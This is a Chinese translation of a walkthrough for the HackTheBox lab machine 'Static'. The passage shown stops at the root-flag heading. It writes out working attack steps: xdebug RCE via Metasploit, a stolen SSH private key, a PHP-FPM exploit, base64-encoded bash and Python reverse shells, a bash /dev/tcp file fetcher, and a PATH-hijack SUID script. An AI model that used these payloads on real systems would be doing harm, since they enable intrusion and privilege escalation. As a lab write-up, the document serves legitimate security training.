# 来自 HackTheBox 的静态—详细演练

> 原文：<https://infosecwriteups.com/static-from-hackthebox-detailed-walkthrough-355c4c98670?source=collection_archive---------1----------------------->

展示完成盒子所需的所有工具和技术。

# 机器信息

![](img/5ef2f6d234d3a363fa9e5ea381663445.png)

静态是 HackTheBox 上的一个硬机器。我们从网站上一个包含损坏备份的隐藏文件夹开始。一旦恢复，我们会得到一个一次性代码，允许我们访问网站的另一个隐藏部分，这次是一个支持门户。从这里我们找到一个配置文件，允许我们连接到另一个网络。我们使用 Meterpreter 在这个新网络上的服务器上获得一个 shell，然后找到一个私钥来进行 SSH 访问。枚举在这个网络上找到更多的服务器，我们通过隧道连接到其中的一个服务器，并利用漏洞实现远程代码执行，最终导致第二个机器上的另一个反向外壳。在那里，我们开发了一个编码很差的定制应用程序，并最终获得了 root。

所需的技能是广泛的列举和研究技能，以发现和利用错误配置。学到的技能是使用本机命令枚举和移动文件。使用 Meterpreter，pspy64，端口转发等等。

[](https://www.hackthebox.eu/home/machines/profile/355) [## 破解盒子::渗透测试实验室—静态

### 登录 Hack The Box 平台，让您的笔测试和网络安全技能更上一层楼！

www.hackthebox.eu](https://www.hackthebox.eu/home/machines/profile/355) 

# 初步侦察

像往常一样，让我们从 Nmap 开始:

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.246 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) 

nmap -p$ports -sC -sV -oA static 10.10.10.246
```

结果:

![](img/1a96c7c5216a72a10e6a617f7b43b70c.png)

Nmap 扫描

三个开放的港口。我们在 22 和 2222 上都有 OpenSSH，它们也是不同的版本，这很有趣。我们在 8080 上也有 Apache，这是我们的起点:

![](img/339e30d36b3229bdd7d4bbdb9299959d.png)

端口 8080 上的静态网站

我们在那里什么也没找到。回头看上面的 Nmap 扫描，我们看到有一个包含两个条目的 robots.txt 文件。我们可以用旋度来确认:

```
┌──(root💀kali)-[~/htb/static]
└─# curl http://static.htb:8080/robots.txt 
User-agent: *
Disallow: /vpn/
Disallow: /.ftp_uploads/
```

# VPN 登录页面

回到浏览器来试试这些。/vpn/ first:

![](img/ad6b3ae2478a52c33b2dd3d3e291624c.png)

VPN 登录页面

我们有一个登录页面。尝试明显的凭证对 admin: admin 有效，我们到达这里:

![](img/0c7740f302170aa0f82b7fc053cda225.png)

VPN 双因素一次性密码

# FTP 备份文件

现在这似乎是一个死胡同，因为我们没有情报找到一条通过那道屏障的路。让我们试试另一个网址:

![](img/89907c8424d8f61984547b720b73e8fc.png)

ftp 上传文件夹

我们有两份文件。一个 warning.txt 和一个 gzip 存档。我们可以读取 txt 文件:

```
┌──(root💀kali)-[~/htb/static]
└─# curl http://static.htb:8080//.ftp_uploads/warning.txt
Binary files are being corrupted during transfer!!! 
Check if are recoverable.
```

一个提示，其他文件需要恢复，然后我们才能 gunzip 它。抓住它:

```
┌──(root💀kali)-[~/htb/static]
└─# wget http://static.htb:8080//.ftp_uploads/db.sql.gz   
--2021-11-01 22:36:55--  http://static.htb:8080//.ftp_uploads/db.sql.gz
Resolving static.htb (static.htb)... 10.10.10.246
Connecting to static.htb (static.htb)|10.10.10.246|:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 262 [application/x-gzip]
Saving to: ‘db.sql.gz’
db.sql.gz           100%[==================>]     262  --.-KB/s    in 0s      
2021-11-01 22:36:55 (50.4 MB/s) - ‘db.sql.gz’ saved [262/262]
```

首先检查我们是否可以 gunzip:

```
┌──(root💀kali)-[~/htb/static]
└─# gunzip db.sql.gz
gzip: db.sql.gz: invalid compressed data--crc error
gzip: db.sql.gz: invalid compressed data--length error
```

好吧，他们没有说谎！搜索修复损坏的 gz 文件的工具时发现了 [gzrecover](https://github.com/arenn/gzrt) 。克隆，制作工具，然后恢复文件:

![](img/fa329424aba9171da12eff35c7029926.png)

正在尝试使用 gzrecorver 恢复文件

要么这不起作用，要么文件需要做更多的工作。经过一番挠头之后，我寻找另一个工具，发现[这个](https://github.com/yonjar/fixgz)可以用:

![](img/0052e9df2bd248038a21ec2b6f441334.png)

尝试使用 fixgz 恢复文件

类似但是好多了！从这里我们可以看到，我们有 admin 的用户名和密码的散列，如果它与我们已经尝试过的相同，那么它也是 admin。出于好奇，让我们来破解它:

```
┌──(root💀kali)-[~/htb/static]
└─# echo "d033e22ae348aeb5660fc2140aec35850c4da997" > hash.txt 

┌──(root💀kali)-[~/htb/static]
└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
admin            (?)
1g 0:00:00:00 DONE (2021-11-01 22:59) 33.33g/s 660800p/s 660800c/s 660800C/s alcala..LOVE1
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed
```

嗯，这很明显，但对练习我们的哈希破解技巧很有好处。

# TOTP 插件

回到压缩文件，我们看到它写着 totp，并给了我们一个代码。什么是 TOTP？基于时间的一次性密码，[这里的](https://www.hypr.com/time-based-time-password-totp-otp/)就是一个很好的解释。我发现[这个](https://github.com/Authenticator-Extension/Authenticator) GitHub repo 链接到一个火狐插件[这里](https://addons.mozilla.org/en-US/firefox/addon/auth-helper/?src=external-github)。

安装完成后，点击图标，然后点击铅笔:

![](img/1e912f5ab837c7ac592444f7e13fe156.png)

Firefox 的 totp 验证器插件

将我们在上面找到的 TOTP 代码添加到机密字段，然后单击确定:

![](img/496c7df2b6afd5c8828e1a845751bb34.png)

添加密码以启用 totp

现在你有一个旋转的一次性代码:

![](img/3d861678428ed57efb35c19affc01bbf.png)

示例代码

下一步应该很简单，你只需像以前一样登录 vpn 页面，并在 2FA 框中输入你的六位数代码。然而，这只有在你的攻击箱时间和静态服务器相同的情况下才有效。对于我来说，时间相差 16 分钟，您可以使用 curl 来获取远程服务器时间:

```
┌──(root💀kali)-[~/htb/static]
└─# curl -i http://10.10.10.246:8080/vpn/login.php  
HTTP/1.1 200 OK
Date: Tue, 02 Nov 2021 21:50:04 GMT
Server: Apache/2.4.29 (Ubuntu)
```

然后与当地时间进行比较:

```
┌──(root💀kali)-[~/htb/static]
└─# date
Tue Nov  2 09:34:51 PM GMT 2021
```

我刚刚更改了我的本地时间以匹配服务器:

```
┌──(root💀kali)-[~/htb/static]
└─# timedatectl set-time '21:50:00'
```

# IT 支持门户

现在回到 vpn 页面，将 totp 代码粘贴到 2FA 框中，我们在这里结束:

![](img/4d574262bbc286ca50ce10bedcaf224e.png)

IT 支持门户

我们位于一个包含服务器列表的支持门户中。如果我们在“常用名”框中键入他们的一个名字，我们就可以下载一个 VPN 连接文件。首先我下载网络服务器:

![](img/683fa1819062e7340b099f4faa95f34e.png)

下载 web.ovpn

尝试使用文件连接到它不起作用:

![](img/5b84d55975a5fae832e18cc308f81960.png)

VPN 未连接

查看上面的连接尝试，我们看到它试图访问 vpn.static.htb，因此让我们将它添加到我们的 hosts 文件中:

```
sed -i '/10.10.10.246 static.htb/ s/$/ vpn.static.htb/' /etc/hosts
```

现在再试一次:

![](img/30f0c58f72aa0f101de8a0b70ab10751.png)

连接到新网络

# 网络服务器

我们已连接到此网络，并有了新的调谐器接口:

```
┌──(root💀kali)-[~/htb/static]
└─# ifconfig tun9
tun9: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 172.30.0.9  netmask 255.255.0.0  destination 172.30.0.9
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5  bytes 240 (240.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

即使我们使用为 web 服务器提供的 vpn 文件进行连接，我们实际上也无法连接到它，尝试只是挂起:

```
┌──(root💀kali)-[~/htb/static]
└─# curl http://172.20.0.10
```

这是因为我们的 tun9 IP 与 web 服务器位于不同的子网。我们可以向我们的接口添加一条新的路由，以允许我们到达不同的网络。[这个](https://www.cyberciti.biz/faq/ip-route-add-network-command-for-linux-explained/)很好的解释了如何添加路线。让我们现在就开始吧:

```
┌──(root💀kali)-[~/htb/static]
└─# ip route add 172.20.0.0/24 dev tun9
```

现在我们可以进入网络服务器:

```
┌──(root💀kali)-[~/htb/static]
└─# traceroute 172.20.0.10             
traceroute to 172.20.0.10 (172.20.0.10),30 hops max,60 byte packets
 1  172.30.0.1 (172.30.0.1)  25.670 ms  27.471 ms  28.446 ms
 2  172.20.0.10 (172.20.0.10)  28.349 ms  28.312 ms  28.214 ms
```

在我们继续之前，我遇到了一些问题，这个到 web 服务器的 VPN 连接不稳定。我发现为了保持可靠性，我必须像这样减少 MTU:

```
┌──(root💀kali)-[~]
└─# ifconfig tun9 mtu 1200

┌──(root💀kali)-[~/htb/static]
└─# ifconfig tun9
tun9: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1200
        inet 172.30.0.10  netmask 255.255.0.0  destination 172.30.0.10
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 3  bytes 252 (252.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5  bytes 348 (348.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

我建议你这样做，否则你可能会浪费很多时间挠头！

接下来，让我们看看浏览器:

![](img/2a0b556568ba2904c0ad2c86f2e6dded.png)

Web 服务器内容

# XDebug

我们找到一个 php 信息文件:

![](img/3a251a05e09205a3ceac7d5546b155f9.png)

Web 服务器 php 信息

浏览文件，我们发现 xdebug 部分在底部:

![](img/608e905c8ebd7661aa6a274d242dffe1.png)

Web 服务器 xdebug 已启用

# 水表读数器

在另一个名为 [Olympus](https://www.hackthebox.com/home/machines/profile/135) 的盒子中也发现了同样的漏洞，我们可以在这里使用同样的 Metasploit 方法。[这篇](https://www.acunetix.com/vulnerabilities/web/xdebug-remote-code-execution-via-xdebug-remote_connect_back/)文章解释了漏洞利用需要启用哪些设置。当我们检查时，我们可以确认它们已设置好，因此让我们启动 Meterpreter:

![](img/eda45e68ab067300bf6ca0d95d2c83ac.png)

使用 Meterpreter 开发 xdebug

连接会话后，我们可以进入 shell 查看:

```
meterpreter > shell
Process 514 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

pwd
/var/www/html/vpn

ls -lsa /home
4 -rwxrwxrwx 1 root     root       33 Nov  3 13:38 user.txt
4 drwxr-x--- 4 www-data www-data 4096 Jun 14 08:02 www-data
```

# 用户标志

不同寻常的是，用户标志位于/home 的根目录中，让我们在这里抓住它:

```
cat /home/user.txt
<HIDDEN>
```

在我们的用户主文件夹中，我们发现了一些有用的东西:

```
ls -lsa /home/www-data
4 drwx------ 2 www-data www-data 4096 Jun 14 08:00 .cache
4 drwx------ 2 www-data www-data 4096 Jun 14 07:54 .ssh

ls -lsa /home/www-data/.ssh
4 -rw-r--r-- 1 www-data www-data  390 Jun 14 07:54 authorized_keys
4 -rw------- 1 www-data www-data 1675 Jun 14 07:34 id_rsa
4 -rw-r--r-- 1 www-data www-data  390 Jun 14 07:34 id_rsa.pub

cat /home/www-data/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA0pNa5qwGZ+DKsS60GPhNfCqZti7z1xPzxOTXwtwO9uYzZpq/
nrhzgJq0nQNVRUbaiZ+H6gR1OreDyjr9YorV2kJqccscBPZ59RAhttaQsBqHkGjJ
<SNIP>
sjZU9eeOecWbg+B6RWQTNcxo/cRjMpxd5hRaANYhcFXGuxcg1N3nszhWDpHIpGr+
s5Mwc3oopgv6gMmetHMr0mcGz6OR9KsH8FvW1y+DYY3tUdgx0gau
-----END RSA PRIVATE KEY-----
```

让我们从这个 Metasploit shell 转移到一个稳定的 SSH 连接。复制我们找到的私人密钥，并传入 Kali 的一个文件:

```
┌──(root💀kali)-[~/htb/static]
└─# echo "-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA0pNa5qwGZ+DKsS60GPhNfCqZti7z1xPzxOTXwtwO9uYzZpq/
nrhzgJq0nQNVRUbaiZ+H6gR1OreDyjr9YorV2kJqccscBPZ59RAhttaQsBqHkGjJ
<SNIP>
sjZU9eeOecWbg+B6RWQTNcxo/cRjMpxd5hRaANYhcFXGuxcg1N3nszhWDpHIpGr+
s5Mwc3oopgv6gMmetHMr0mcGz6OR9KsH8FvW1y+DYY3tUdgx0gau
-----END RSA PRIVATE KEY-----" > id_rsa

┌──(root💀kali)-[~/htb/static]
└─# chmod 600 id_rsa
```

我尝试使用 SSH 密钥连接到主静态箱:

```
┌──(root💀kali)-[~/htb/static]
└─# ssh -i id_rsa_www-data www-data@10.10.10.246
www-data@10.10.10.246's password: 
Permission denied, please try again.
www-data@10.10.10.246's password: 
Permission denied, please try again.
www-data@10.10.10.246's password: 
www-data@10.10.10.246: Permission denied (publickey,password).
```

# 用户 SSH 访问

这不起作用，但有趣的是，我们可以使用 www-data 的 SSH 密钥连接到 172 IP 的 web 服务器:

```
┌──(root💀kali)-[~/htb/static]
└─# ssh -i id_rsa www-data@172.20.0.10 
Last login: Wed Nov  3 21:38:58 2021 from 10.10.15.41
www-data@web:~$
```

我们还可以使用它来连接到主静态箱，但是在我们从初始扫描中看到的端口 2222 上也运行 SSH:

```
┌──(root💀kali)-[~/htb/static]
└─# ssh -i id_rsa www-data@10.10.10.246 -p 2222
Last login: Mon Jun 14 08:00:30 2021 from 10.10.14.4
www-data@web:~$
```

为了简单起见，我退出了 web VPN，继续使用 SSH 直接连接到机器。在我查看网络连接之前，没有什么明显的变化:

```
www-data@web:/$ ifconfig eth1
eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.254.2  netmask 255.255.255.0  broadcast 192.168.254.255
        ether 02:42:c0:a8:fe:02  txqueuelen 0  (Ethernet)
        RX packets 392  bytes 361065 (361.0 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 498  bytes 36481 (36.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

我们有第二个到不同网络的连接，机器上没有 nmap。我做了一个简单的循环来扫描网络:

```
www-data@web:/$ for i in {1..254} ;do (ping -c 1 192.168.254.$i | grep "bytes from" &) ;done64 bytes from 192.168.254.1: icmp_seq=1 ttl=64 time=0.097 ms
64 bytes from 192.168.254.2: icmp_seq=1 ttl=64 time=0.048 ms
64 bytes from 192.168.254.3: icmp_seq=1 ttl=64 time=0.088 ms
```

我们得到了两个 IP 以及我们自己的回复。让我们使用[这个](https://coderwall.com/p/udnrjq/port-scanning-with-bash-without-sudo-nmap-or-nc)有用的 bashfu 扫描它们的开放端口:

```
www-data@web:/$ nmap2 () {
> [[ $# -ne 1 ]] && echo "Please provide server name" && return 1
> 
> for i in {1..9000} ; do
>   SERVER="$1"
>   PORT=$i
>   (echo  > /dev/tcp/$SERVER/$PORT) >& /dev/null &&
>    echo "Port $PORT seems to be open"
> done
> }

www-data@web:/$ nmap2 192.168.254.1
Port 22 seems to be open
Port 2222 seems to be open

www-data@web:/$ nmap2 192.168.254.2
Port 22 seems to be open
Port 80 seems to be open

www-data@web:/$ nmap2 192.168.254.3
Port 80 seems to be open
```

回头看看我们之前找到的 IT 支持门户，我注意到 192.168.254.3 作为一个名为 pki 的服务器列在那里。从扫描中我们可以看到端口 80 是打开的，为了达到这个目的，我们需要通过这个 SSH 连接从 Kali 建立一个端口隧道。我们之前已经这样做过很多次了，比如在 [GameZone](https://pencer.io/ctf/ctf-thm-game-zone) 上，我们简单地转发端口 80:

```
┌──(root💀kali)-[~/htb/static]
└─# ssh -L 80:192.168.254.3:80 www-data@10.10.10.246 -p2222 -i id_rsa
www-data@web:~$
```

# PKI 服务器

在这里，我们已经说过，Kali 上任何到端口 80 的流量都通过 SSH 连接转发到端口 2222 上的 10.10.10.246，并将其传递到端口 80 上的 192.168.254.3。这里有一篇很好的文章[对此做了更多的解释。](https://www.ssh.com/academy/ssh/tunneling/example)

现在我们可以访问 pki 服务器了:

```
┌──(root💀kali)-[~/htb/static]
└─# curl -i localhost
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 03 Nov 2021 22:27:24 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP-FPM/7.1

batch mode: /usr/bin/ersatool create|print|revoke CN
```

好吧，我承认我期待更多！搜索 PHP-FPM 漏洞会发现 Github 上有很多选项，比如[这个](https://github.com/AleWong/PHP-FPM-Remote-Code-Execution-Vulnerability-CVE-2019-11043-)一个、[这个](https://github.com/neex/phuip-fpizdam)一个或者[这个](https://github.com/theMiddleBlue/CVE-2019-11043)一个。我选择了最简单的，一个简单的 Python 脚本:

![](img/4244dae8fd76e052fe0699c1b4476a48.png)

PHP-FPM 漏洞

# RCE 利用

我们可以通过隧道在服务器上运行它:

```
┌──(root💀kali)-[~/htb/static]
└─# python3 exploit.py --url http://localhost/index.php
[*] QSL candidate: 1754, 1759, 1764
[*] Target seems vulnerable (QSL:1754/HVL:224): PHPSESSID=d129421703528e986f0c21155dd4b765; path=/
[*] RCE successfully exploited!

    You should be able to run commands using:
    curl http://localhost/index.php?a=bin/ls+/
```

看起来不错，我们试试吧:

```
┌──(root💀kali)-[~/htb/static]
└─# curl -s http://localhost/index.php?a=/usr/bin/id
[03-Nov-2021 22:41:23 UTC] PHP Warning:  Unknown: Unable to load dynamic library 'uid=33(www-data) gid=33(www-data) groups=33(www-data)
' - uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

这是可行的，所以我们可以通过隧道远程执行代码到服务器。但是我们不能在 pki 服务器上执行反向 shell，并在 Kali 上将其捕获回来。相反，我们需要在中间的 web 服务器上，所以我们只需要复制 netcat 的静态二进制文件，因为它目前不在机器上。

Github 上有很多选项，我用的是[这个](https://github.com/H74N/netcat-binaries/blob/master/nc)的:

![](img/fa02d0473b184a54ed244582e51e6a54.png)

下载 nc 的静态版本

我们还需要带上 curl over，我用的是[这个](https://github.com/moparisthebest/static-curl)一个:

![](img/b557cb32dc527423eb1ae408db569303.png)

下载 curl 的静态版本

现在我们需要将它们复制到 web 框中:

```
┌──(root💀kali)-[~/htb/static]
└─# scp -P 2222 -i id_rsa nc  www-data@10.10.10.246:/tmp
nc                               100%  762KB   1.8MB/s   00:00
┌──(root💀kali)-[~/htb/static]
└─# scp -P 2222 -i id_rsa curl-amd64  www-data@10.10.10.246:/tmp
curl-amd64                       100% 3371KB   2.1MB/s   00:01
```

# 反向外壳有效负载

最后，我们需要创建我们的有效载荷。我们可以从[这里](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)取一个 pentestmonkey 反向 shell。然后我们用 base64 和 URL 编码它:

```
┌──(root💀kali)-[~/htb/static]
└─# echo -n "/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.254.2/1337 0>&1'" | base64
L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi8xMzM3IDA+JjEn
```

将 base64 编码字符串放入 echo，解码，然后传递给 bash，以便能够在机器上安全地执行。URL 也对其进行编码，让我们使用 Python 来实现:

```
┌──(root💀kali)-[~/htb/static]
└─# python3 -c "import urllib.parse; print(urllib.parse.quote('/bin/bash -c \'echo -n L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi8xMzM3IDA+JjEn | base64 -d | bash\''))" 
/bin/bash%20-c%20%27echo%20-n%20L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi8xMzM3IDA%2BJjEn%20%7C%20base64%20-d%20%7C%20bash%27
```

现在，我们有了像以前一样使用 a=参数的有效负载。所以我们最后的命令看起来像这样:

```
./curl-amd64 -s http://192.168.254.3/index.php?a=/bin/bash%20-c%20%27echo%20-n%20L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi8xMzM3IDA%2BJjEn%20%7C%20base64%20-d%20%7C%20bash%27
```

在 web box 上执行之前，我们需要打开第二个 SSH 会话，nc 等待捕获 shell:

```
┌──(root💀kali)-[~/htb/static]
└─# ssh -i id_rsa www-data@10.10.10.246 -p 2222                                     
Last login: Sat Nov  6 16:04:52 2021 from 10.10.15.41

www-data@web:~$ cd /tmp
www-data@web:/tmp$ ./nc -nlvp 1337
listening on [any] 1337 ...
```

现在，将 curl 命令粘贴到我们在 web box 上打开的第一个 SSH 会话中:

```
www-data@web:/tmp$ ./curl-amd64 -s http://192.168.254.3/index.php?a=/bin/bash%20-c%20%27echo%20-n%20L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi8xMzM3IDA%2BJjEn%20%7C%20base64%20-d%20%7C%20bash%27
```

# PKI 服务器反向外壳

切换到我们的第二个 SSH 会话，看看我们有一个反向 shell 连接到 192.168.254.2 上的 pki 箱:

```
www-data@web:/tmp$ ./nc -nlvp 1337
listening on [any] 1337 ...
connect to [192.168.254.2] from (UNKNOWN) [192.168.254.3] 34382
bash: cannot set terminal process group (11): Inappropriate ioctl for device
bash: no job control in this shell
www-data@pki:~/html$
```

相反，我们可以使用一个 liner 来创建我们的有效负载，并在一个程序中执行所有操作:

```
www-data@web:/tmp$ python3 -c "import urllib.parse; import os; PAYLOAD=('./curl-amd64 -s http://192.168.254.3/index.php?a='); PAYLOAD+=(urllib.parse.quote('/bin/bash -c \'echo -n L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi8xMzM3IDA+JjEn | base64 -d | bash\'')); os.system(PAYLOAD)"
```

另一个选择是使用[请求](https://docs.python-requests.org/en/latest/user/quickstart/#make-a-request)库的 Python 脚本:

```
#!/usr/bin/env python
import requests
payload = '/usr/bin/python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.254.2",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);\''
requests.get("http://192.168.254.3/index.php?a="+payload)
```

如果您想这样做，那么将上面的 Python 放在一个名为 script.py 的文件中，并将其上传到 box:

```
┌──(root💀kali)-[~/htb/static]
└─# scp -P 2222 -i id_rsa script.py www-data@10.10.10.246:/tmp
script.py                        100%  353    16.4KB/s   00:00
```

然后在 web box 上执行它:

```
www-data@web:/tmp$ chmod +x script.py
www-data@web:/tmp$ ./script.py
```

不管我们是通过哪种方式获得 shell 的，现在是时候看看这个新的 pki 盒子了。但是这里没有主文件夹，passwd 文件显示只有 root 用户可以登录:

```
www-data@pki:~/html$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

# 代用醇

早些时候，当访问 pki 盒上的端口 80 时，我们得到了以下响应:

```
batch mode: /usr/bin/ersatool create|print|revoke CN
```

寻找二进制文件也能找到它的源代码:

```
www-data@pki:~/html$ find / -name ersa* 2>/dev/null
find / -name ersa* 2>/dev/null
/usr/src/ersatool.c
/usr/bin/ersatool
```

我查看了替代工具的源代码，但是我不擅长 C 语言，也不能理解它。相反，我们可以复制。c 文件到 Kali，编译它，然后使用一个类似 Ghidra 的调试器来分析它是如何工作的。或者我们可以使用 [pspy64](https://github.com/DominicBreuker/pspy) 像我们在其他盒子上做的一样，例如[冰壶](https://www.hackthebox.com/home/machines/profile/160)和[老师](https://www.hackthebox.com/home/machines/profile/165)来查看运行过程。我要用 pspy64，因为它很容易使用，所以让我们把它下载到 Kali，然后复制到 web 服务器:

![](img/77c13c4414a22440961a1a41d9d41ba5.png)

下载 pspy64 并复制到服务器

对于 web box 上的文件，我们需要启动我们的 web 服务器，以便能够从 pki box 访问它:

```
www-data@web:/tmp$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

# Bash Wget 替代

现在我们需要把 pspy64 放到 pki 盒子里，这并不容易，因为它没有 nc、wget、curl 或其他有用的东西。搜索有很多关于如何使用 echo、exec、sed 和其他工具的例子，比如[这个](https://www.shell-tips.com/bash/download-files-from-shell)一个、[这个](https://superuser.com/questions/40545/upgrading-and-installing-packages-through-the-cygwin-command-line/496572#496572)一个或[这个](https://unix.stackexchange.com/questions/83926/how-to-download-a-file-using-just-bash-and-nothing-else-no-curl-wget-perl-et)一个。

只需复制其中一个示例并粘贴到 pki 服务器上的 shell 中:

```
function _get() {
    read proto server path <<<$(echo ${1//// })
    DOC=/${path// //}
    HOST=${server//:*}
    PORT=${server//*:}
    [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
    exec 3<>/dev/tcp/${HOST}/$PORT
    echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
    (while read line; do
        [[ "$line" == $'\r' ]] && break
    done && cat) <&3
    exec 3>&-
}
```

现在我们可以使用这个函数:

```
www-data@pki:/tmp$ _get http://192.168.254.2:8000/pspy64 > pspy64
_get http://192.168.254.2:8000/pspy64 > pspy64

www-data@pki:/tmp$ ls -lsa p*
ls -lsa p*
3008 -rw-r--r-- 1 www-data www-data 3078592 Nov  6 20:47 pspy64

www-data@pki:/tmp$ chmod +x pspy64
```

# Pspy64

我们复制了 pspy64 并使其可执行，现在我们运行它，让它监视我们正在做的事情:

![](img/4fae8a0edfaed3fb974ddf0e5db77c7d.png)

在目标上运行 pspy64

当 pspy64 正在观察时，我们需要另一个到 pki 盒的会话，以便我们可以与替代工具交互。只需对 base64 和 URL 编码重复上述相同的过程，然后再次使用 web box 上的漏洞触发远程命令执行。我将端口 1338 用于第二个到 pki 盒的连接，因为第一个运行 pspy64 的是端口 1337:

```
┌──(root💀kali)-[~/htb/static]
└─# ssh -i id_rsa www-data@10.10.10.246 -p 2222
Last login: Sat Nov  6 21:56:12 2021 from 10.10.15.41

www-data@web:~$ cd /tmp
www-data@web:/tmp$ ./nc -nlvp 1338
listening on [any] 1338 ...
connect to [192.168.254.2] from (UNKNOWN) [192.168.254.3] 50620
bash: cannot set terminal process group (16): Inappropriate ioctl for device
bash: no job control in this shell
www-data@pki:/tmp$
```

现在我们可以使用代用工具:

```
www-data@pki:/tmp$ ersatool
ersatool
# create
create->CN=a
client
dev tun9
proto udp
remote vpn.static.htb 1194
resolv-retry infinite
nobind
user nobody
group nogroup
persist-key
persist-tun

remote-cert-tls server

cipher AES-256-CBC
#auth SHA256
key-direction 1
verb 3
<ca>
-----BEGIN CERTIFICATE-----
MIIDRzCCAi+gAwIBAgIUR+mYrXHJORV4tbg81sQS7RfjYK4wDQYJKoZIhvcNAQEL
BQAwFDESMBAGA1UEAwwJc3RhdGljLWd3MCAXDTIwMDMyMjEwMTYwMVoYDzIxMjAw
<SNIP>
2aafeb626aadb6abc35fa023426c9334
ea5f5af8329f367f112599f3e668bd7a
-----END OpenVPN Static key V1-----
</tls-auth>
create->CN=
# exit
```

输出很长，从中可以看到生成了各种密钥和文件。如果我们切换回 pki 框上的另一个会话，我们会在 pspy64 中看到一些有趣的东西:

![](img/883f787aeca1faee452e12d6fc9f6a9c.png)

Pspy64 输出

# 路径开发

执行的一些命令没有获得二进制文件的完整路径。从上面我们可以看到 mktemp、openssl 和 mv 都被直接调用，这意味着环境变量中的路径被用来查找它们。这是一个众所周知的升级路径，这里有一个很好的解释，我在另一个名为[预览](https://www.hackthebox.com/home/machines/profile/373)的框中使用了一个。

首先，我们在/tmp 文件夹中创建一个文件，该文件的名称是我们看到的一个命令的名称，但没有指定路径，我对这个命令使用的是 openssl。pki 盒子上没有文本编辑器，所以让我们在 Kali 上完成它，然后我们可以将 base64 复制到盒子上:

```
┌──(root💀kali)-[~/htb/static]
└─# echo "#\!/bin/bash                                                                                           
/bin/cp /bin/bash /tmp/bash
chmod u+s /tmp/bash" | base64          
IyEvYmluL2Jhc2gKL2Jpbi9jcCAvYmluL2Jhc2ggL3RtcC9iYXNoCmNobW9kIHUrcyAvdG1wL2Jhc2gK
```

现在将它粘贴到 box 上，解码回多行 bash 脚本，并输出到一个名为 openssl 的文件:

```
www-data@pki:/tmp$ echo "IyEvYmluL2Jhc2gKL2Jpbi9jcCAvYmluL2Jhc2ggL3RtcC9iYXNoCmNobW9kIHUrcyAvdG1wL2Jhc2gK" | base64 -d > openssl
www-data@pki:/tmp$ ls -lsa
ls -lsa
   4 -rwxr-xr-x 1 www-data www-data      60 Nov  6 19:40 openssl
```

将我们的/tmp 路径添加到环境$PATH 变量的开头:

```
www-data@pki:/tmp$ export PATH=/tmp:$PATH
www-data@pki:/tmp$ echo $PATH  
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

# 根标志

